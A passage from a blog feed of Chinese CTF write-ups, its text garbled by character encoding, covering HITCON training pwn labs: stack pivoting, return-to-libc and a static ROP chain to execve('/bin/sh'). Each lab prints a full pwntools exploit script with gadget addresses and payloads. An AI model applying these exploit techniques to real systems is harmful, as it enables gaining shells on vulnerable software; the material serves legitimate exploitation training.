†ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ rop åŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨</li></ul><p>æ­¤å¤–ï¼Œåˆ©ç”¨ stack pivoting æœ‰ä»¥ä¸‹å‡ ä¸ªè¦æ±‚:</p><ul><li>å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li><li>å¯ä»¥æ§åˆ¶ sp æŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆä¼šä½¿ç”¨ ROPï¼Œå¸¸è§çš„æ§åˆ¶æ ˆæŒ‡é’ˆçš„ gadgets ä¸€èˆ¬æ˜¯</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>åœ¨è¿™é¢˜ä¸­ï¼Œæº¢å‡ºé•¿åº¦ä¸å¤Ÿå¯¼è‡´æ— æ³•ä¸€æ¬¡æ€§æ„é€ ropchainï¼Œå¹¶ä¸”è¿˜é™åˆ¶äº†mainå‡½æ•°æº¢å‡ºçš„æ¬¡æ•°ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>å¼€å¯äº†NXã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ida é‡Œé¢çœ‹ä¸€çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>bufå¤§å°ä¸º0x28 = 40å­—èŠ‚ï¼Œè€Œreadè¯»å–0x40 = 64å­—èŠ‚</p><p>gdbè·‘ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>ä¹Ÿå°±æ˜¯è¯´æœ‰4ä¸ªå­—èŠ‚è¢«è¯»å–åˆ°EBPä¸­ï¼Œå‰©ä¸‹20ä¸ªæº¢å‡ºå­—èŠ‚å¯ä»¥ç”¨æ¥æ„é€ ropchainã€‚</p><p>æœç´¢ä¸€ä¸‹å¯ç”¨çš„gadgetï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><p>expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 ä¸ºebpï¼Œeip ==> read_plt ==> leave_retä¸ºè¿”å›åœ°å€ ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#é€šè¿‡ä¹‹å‰çš„leave_retï¼Œå°†buf2ä½œä¸ºebpï¼Œå¾—åˆ°puts_addr,é€šè¿‡libcæ³„éœ²å¾—åˆ°binshï¼Œsystem_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#æ‡µé€¼æ ˆ</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expè¿è¡Œæ•ˆæœï¼š<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>è¿™é¢˜ä¼ªé€ å‡æ ˆå¸§ï¼Œä»è€Œæ„é€ ropchainï¼Œç®€ç›´å°±æ˜¯ä¸€åœºæ¶ˆåŒ–ç››å®´ï¼Œæˆ‘éœ€è¦å¥½å¥½æ¶ˆåŒ–ä¸€ä¸‹lab6ã€‚</p><p>ä»Šå¤©è¿˜çœ‹äº†ä¸€ä¸‹å®‰æ’ä¸€å‘¨å¹´ç‰¹åˆ«èµ›çš„ä¸€é“pwné¢˜â€“overï¼Œåšä¸€åŠå‘ç°åªèƒ½æ§åˆ¶ebpå’Œeipï¼Ÿï¼Ÿï¼Ÿæ²¡æƒ³åˆ°æ˜¯å®‰æ’æ¯å…­æœˆèµ›çš„ä¸€é“åŸé¢˜ï¼Œåœ¨ctf-wikiçš„èŠ±å¼æ ˆæº¢å‡ºæŠ€å·§é‡Œé¢æœ‰ï¼Œå¹¶ä¸”å’Œlab6ä¸€æ ·ä¹Ÿæ˜¯é€šè¿‡æ§åˆ¶ebpå’Œeipæ¥åšï¼Œä½†æ˜¯é‚£é¢˜å¹¶æ²¡æœ‰å¤šå‡ºæ¥çš„æº¢å‡ºå­—èŠ‚ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œä¸¤ç§éƒ½å¯ä»¥ç§°ä½œä¼ªé€ å‡æ ˆå¸§ï¼š<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-èŠ±å¼æ ˆæº¢å‡º</a>ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ25-Hitcon-ä¸‰&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ25-Hitcon-ä¸‰&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ25-Hitcon(ä¸‰)&quot;&gt;&lt;/a&gt;Pwn-10æœˆ25-Hitcon(ä¸‰
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ24-Hitcon(äºŒ)</title>
    <link href="http://www.yof3ng.xyz/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/"/>
    <id>http://www.yof3ng.xyz/2018/10/24/Pwn-10æœˆ24-Hitcon-äºŒ/</id>
    <published>2018-10-24T04:45:45.000Z</published>
    <updated>2018-11-02T14:21:09.216Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ24-hitcon-äºŒ"><a href="#Pwn-10æœˆ24-hitcon-äºŒ" class="headerlink" title="Pwn-10æœˆ24-hitcon(äºŒ)"></a>Pwn-10æœˆ24-hitcon(äºŒ)</h1><blockquote><p>ç»§ç»­hitconçš„è§£é¢˜ä¹‹è·¯ã€‚</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>æ‹¿åˆ°é¢˜ç›®çœ‹é¢˜ç›®åï¼Œå’Œlab3çš„ret2scå·®ä¸å¤šï¼Œè¿™ä¸ªåº”è¯¥æ˜¯return to libcï¼Œä¹Ÿæ˜¯ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚æ³„éœ²libcå¹¶ä¸”leakå‡ºlibcåŸºåœ°å€ï¼Œä»è€Œgetshellï¼ŸğŸ˜„</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ç®€å•è·‘ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>ç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œä»¥æ•´å‹çš„å½¢å¼è¾“å…¥ï¼Œç„¶åå®ƒä¼šè¿”å›è¿™ä¸ªåœ°å€å­˜æœ‰çš„å†…å®¹ç»™æˆ‘ä»¬ï¼Œç„¶åè®©æˆ‘ä»¬<code>leave some message</code>ï¼Œå¹¶ä¸”æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªåŠŸèƒ½ä»GOTè¡¨ä¸­å°†ä¸€äº›å‡½æ•°çš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥ï¼Œç„¶åé€šè¿‡libcæ–‡ä»¶ä¸­å‡½æ•°çš„åç§»é‡è®¡ç®—åŸºåœ°å€ï¼Œä¾‹å¦‚å°†æŸä¸€ä¸ªå‡½æ•°çš„GOTæ¡ç›®çš„åœ°å€ä¼ ç»™writeå‡½æ•°ï¼Œå°±å¯ä»¥æ³„æ¼è¿™ä¸ªå‡½æ•°åœ¨è¿›ç¨‹ç©ºé—´ä¸­çš„çœŸå®åœ°å€ï¼Œ<strong>GOTè¡¨ä¸­æ‰€å­˜çš„putså‡½æ•°çš„åœ°å€ä¾¿æ˜¯åœ¨ret2libè¿›ç¨‹ä¸­çš„å®é™…åœ°å€ã€‚</strong></p><p>IDAé‡Œé¢çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>é€šè¿‡å‘½ä»¤<code>readelf -V ret2lib</code>å¯ä»¥æŸ¥åˆ°å…¶libcåº“ç‰ˆæœ¬ä¸º<code>libc.so.6</code>ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>é€šè¿‡pwntoolsçš„elfæ¨¡å—æˆ‘ä»¬å¯ä»¥é“¾æ¥è¯¥libc.so.6åº“ï¼Œç®€å•çœ‹çœ‹é‡Œé¢çš„å‡½æ•°åœ°å€ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>åŒæ ·é’ˆå¯¹è¿™é¢˜å¯ä»¥ä½¿ç”¨IDA <code>alt + t</code>æ¥æŸ¥æ‰¾GOTè¡¨putsåœ°å€ï¼Œä¹Ÿå¯é€šè¿‡ä¸Šè¿°ELFæ¨¡å—é“¾æ¥ret2libç¨‹åºï¼Œé€šè¿‡<code>elf.got[&#39;puts&#39;]</code>æ¥è·å–GOTè¡¨ä¸­putsæ¡ç›®åœ°å€:</p><p><img src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" alt=""></p><p>å°†134520860ä½œä¸ºæˆ‘ä»¬éœ€è¦è·å¾—å†…å®¹çš„åœ°å€è¾“å…¥ç¨‹åºï¼š</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†putså‡½æ•°æ¡ç›®åœ¨å­˜åœ¨GOTè¡¨ä¸­çš„å†…å®¹ï¼Œå³<strong>æ­¤æ¬¡</strong>ç¨‹åºè¿è¡Œæ—¶putså‡½æ•°çš„çœŸå®åœ°å€<code>0xf7639250</code>ã€‚</p><p>libcåŸºåœ°å€è®¡ç®—ï¼š<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p><p>è¿™é‡Œæˆ‘åªæ˜¯ç®€å•çš„å±•ç¤ºä¸€ä¸‹è®¡ç®—æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­libcçš„<strong>åŸºåœ°å€æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„</strong>ï¼Œæ‰€ä»¥ä¸èƒ½æå‰è®¡ç®—å¥½åŸºåœ°å€ï¼Œå†å†™expï¼Œè¦åœ¨expé‡Œé¢è®¡ç®—åŸºåœ°å€ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™ã€‚</p><p>æ—¢ç„¶å·²ç»å¯ä»¥è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªshï¼Œå¯ä»¥å¯»æ‰¾binaryç¨‹åºæœ¬èº«ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨libcä¸­çš„ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" alt=""></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡Print_message()å‡½æ•°æº¢å‡ºï¼Œè¦†ç›–EIPçš„å€¼ä½¿å…¶è·³è½¬æ‰§è¡Œsystemå‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd018a67369c.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°paddingé•¿åº¦ä¸º60ï¼Œæ¥ä¸‹æ¥å†™expå³å¯.</p></blockquote><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[â€˜systemâ€™]</p><p>return_addr = â€˜anythingâ€™</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#mainå‡½æ•°åœ°å€</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00æ˜¯å› ä¸ºå¯èƒ½åŒ¹é…åˆ°å…¶ä»–å­—ç¬¦ä¸²ï¼Œä»è€ŒåŠ ä¸ªæˆªæ–­</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" alt=""></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?ç»å†ç»æœ›çš„è¿‡ç¨‹ğŸ˜­ï¼Œåˆæ˜¯ä¸€ä¸ªæ„é€ ropchainçš„é¢˜ç›®ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" alt=""></p><p>å¼€å¯äº†NXï¼Œæ ˆä¸å¯æ‰§è¡Œé˜²æŠ¤ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>é€šè¿‡idaçœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" alt=""></p><p>é€»è¾‘ååˆ†ç®€å•ï¼Œå°±æº¢å‡ºç„¶åæ„é€ rop chainï¼Œé€šè¿‡gdbåŠ¨æ€è°ƒè¯•å¾—åˆ°æº¢å‡ºç‚¹ï¼Œpaddingä¸º32ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" alt=""></p><p>ä½†æ˜¯è¿™ä¸ªé¢˜å‹è²Œä¼¼å«ï¼š<code>ret2systemcall</code>ï¼Œæ­¤ç¨‹åºä¸­æ—¢æ— systemå‡½æ•°ï¼Œä¹Ÿæ— /bin/shå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯é™æ€ç¼–è¯‘ï¼Œæ–°å§¿åŠ¿ ==&gt;rop chainå int 0x80ä¸­æ–­ä»è€Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨==&gt; <code>execve(/bin/sh)</code>ã€‚</p><p><strong>åŸç†ï¼šé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)</strong></p><p><img src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" alt=""></p></blockquote><p>ä¸çŸ¥é“ä¸ºå•¥æˆ‘çš„ROPgadgetæŸ¥ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„gadgetã€‚</p><h3 id="æ„é€ exp-1"><a href="#æ„é€ exp-1" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span 